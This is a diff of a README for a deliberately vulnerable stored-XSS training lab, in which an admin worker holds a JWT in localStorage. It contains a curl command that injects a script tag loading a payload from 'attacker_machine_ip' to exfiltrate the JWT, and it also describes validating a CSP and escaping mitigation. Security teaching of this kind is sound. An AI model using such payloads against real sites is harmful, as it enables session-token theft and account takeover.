+#### `/admin/messages` With JWT
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
@@ -659,12 +937,10 @@ curl -i -X POST http://cross.fit/contact \
   --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-messages-with-jwt.js\"></script>"
 ```
 
-## Worker Behavior
-
-The worker intentionally behaves like a real privileged user:
+### Worker Behavior
 
 1. Requests a JWT from `http://backend.cross.fit/api/login`
-2. Stores that JWT in the privileged browser `localStorage`
+2. Stores that JWT in privileged browser `localStorage`
 3. Visits `/admin/messages/next?token=...`
 4. Waits for the page to render
 5. Marks the message as processed
@@ -675,24 +951,7 @@ Logs:
 docker compose logs -f worker
 ```
 
-## Dalfox
-
-Primary scenario:
-
-```bash
-dalfox url "http://cross.fit/contact" \
-  -X POST \
-  -d "full_name=Test&email=test@example.com&phone=123&message=INJECT_HERE"
-```
-
-Notes:
-
-- this repository does not include the optional `/preview` helper route
-- the core exercise focuses on the stored XSS chain, not a reflected helper
-
-## Mitigation Mode
-
-Switch the lab to mitigated mode:
+### Mitigation Mode
 
 ```bash
 LAB_MODE=mitigated docker compose up -d --build internal-app worker
@@ -700,43 +959,41 @@ LAB_MODE=mitigated docker compose up -d --build internal-app worker
 
 Mitigated behavior:
 
-- message detail renders escaped content instead of raw HTML
-- CSP blocks inline scripts and inline event handlers
-- the internal auth model remains explicit JWT, but the XSS sink is no longer executable
+- escaped output instead of raw HTML
+- CSP blocks inline scripts and handlers
+- explicit JWT model remains, but the XSS sink no longer executes
 
-## Validate The Mitigation
+### Validate Mitigation
 
 1. Start a fresh `collector.py`.
 2. Switch to mitigated mode.
-3. Submit the same payloads again.
+3. Submit the same payloads.
 4. Watch the worker logs.
-5. Confirm the collector receives nothing.
+5. Confirm that no exfiltration arrives.
 
 Expected:
 
 - the worker still processes the message
-- the payload appears as text in the internal detail view
+- the payload is rendered as text
 - no JWT theft reaches the collector
 - no `/internal-html` POST reaches the collector
 
-## Shutdown
+### Shutdown
 
 ```bash
 docker compose down -v
 ```
 
-## Notes About Intentional Insecurity
+### Intentional Insecurity
 
 This repository intentionally includes:
 
-- stored attacker-controlled HTML in the public form flow
-- a vulnerable raw HTML sink in the admin detail page when `LAB_MODE=vulnerable`
+- stored attacker-controlled HTML in the public flow
+- a vulnerable raw HTML sink in the internal detail view when `LAB_MODE=vulnerable`
 - static lab credentials (`admin/admin123`)
 - a JWT stored in `localStorage` inside the privileged browser
 
-These choices exist only for the lab scenario.
-
-## References
+### References
 
 - OWASP Cross-Site Scripting:
   `https://owasp.org/www-community/attacks/xss/`
